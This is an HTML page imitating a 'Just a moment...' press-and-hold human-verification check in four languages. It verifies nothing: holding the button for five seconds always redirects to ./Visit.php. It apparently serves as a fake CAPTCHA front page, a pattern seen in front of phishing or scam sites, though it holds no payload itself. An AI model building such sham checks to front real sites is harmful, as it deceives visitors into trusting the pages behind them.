<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Just a moment...</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      background-color: #60cdff; /* Light blue background */
    }
    .captcha-container {
      background: white;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
      text-align: center;
      max-width: 400px;
      border: 2px solid #000000; /* Black border */
    }
    .captcha-title {
      font-size: 1.5em;
      margin-bottom: 20px;
      color: #000000; /* Black text */
    }
    .captcha-button {
      background-color: #008cff; /* Primary blue for button */
      color: white;
      padding: 15px 30px;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      font-size: 1.2em;
      outline: none;
    }
    .captcha-button:active {
      background-color: #0066cc; /* Darker blue when pressed */
    }
    .progress-bar {
      width: 100%;
      height: 10px;
      background-color: #e0e0e0;
      border-radius: 5px;
      margin-top: 20px;
      overflow: hidden;
    }
    .progress-fill {
      width: 0;
      height: 100%;
      background-color: #008cff; /* Primary blue for progress */
      transition: width 5s linear;
    }
    .error-message {
      color: #000000; /* Black error message */
      margin-top: 10px;
      display: none;
    }
  </style>
</head>
<body>
  <div class="captcha-container">
    <div class="captcha-title" id="captchaTitle">Please Verify You are a Human</div>
    <button class="captcha-button" id="captchaButton">Press and Hold</button>
    <div class="progress-bar" id="progressBar">
      <div class="progress-fill" id="progressFill"></div>
    </div>
    <div class="error-message" id="errorMessage">You didn't hold the button long enough. Try again.</div>
  </div>

  <script>
    // Translation object for multiple languages
    const translations = {
      'en': {
        title: 'Please Verify You are a Human',
        button: 'Press and Hold',
        error: "You didn't hold the button long enough. Try again."
      },
      'es': {
        title: 'Por favor, verifica que eres humano',
        button: 'Presiona y mantén',
        error: 'No mantuviste presionado el botón lo suficiente. Intenta de nuevo.'
      },
      'fr': {
        title: 'Veuillez vérifier que vous êtes humain',
        button: 'Appuyez et maintenez',
        error: "Vous n'avez pas maintenu le bouton assez longtemps. Réessayez."
      },
      'de': {
        title: 'Bitte verifizieren Sie, dass Sie kein Roboter sind',
        button: 'Drücken und halten',
        error: 'Sie haben den Button nicht lange genug gedrückt. Versuchen Sie es erneut.'
      }
    };

    // Detect browser language
    const userLang = (navigator.language || navigator.userLanguage || 'en').split('-')[0];
    const selectedLang = translations[userLang] ? userLang : 'en'; // Fallback to English

    // Apply translations
    document.getElementById('captchaTitle').textContent = translations[selectedLang].title;
    document.getElementById('captchaButton').textContent = translations[selectedLang].button;
    document.getElementById('errorMessage').textContent = translations[selectedLang].error;

    // CAPTCHA logic
    const button = document.getElementById('captchaButton');
    const progressFill = document.getElementById('progressFill');
    const errorMessage = document.getElementById('errorMessage');
    let holdTimer = null;
    let isHolding = false;

    // Start hold timer
    function startHold() {
      isHolding = true;
      errorMessage.style.display = 'none';
      progressFill.style.width = '0%';
      progressFill.style.transition = 'width 5s linear';
      progressFill.style.width = '100%';

      holdTimer = setTimeout(() => {
        if (isHolding) {

          window.location.href = './Visit.php';
        }
      }, 5000);
    }

    // Stop hold timer
    function stopHold() {
      isHolding = false;
      clearTimeout(holdTimer);
      progressFill.style.transition = 'none';
      progressFill.style.width = '0%';
      errorMessage.style.display = 'block';
      setTimeout(() => {
        errorMessage.style.display = 'none';
      }, 10000);
    }

    // Event listeners for mouse
    button.addEventListener('mousedown', startHold);
    button.addEventListener('mouseup', stopHold);
    button.addEventListener('mouseleave', stopHold);

    // Event listeners for touch devices
    button.addEventListener('touchstart', (e) => {
      e.preventDefault();
      startHold();
    });
    button.addEventListener('touchend', stopHold);
  </script>
</body>
</html>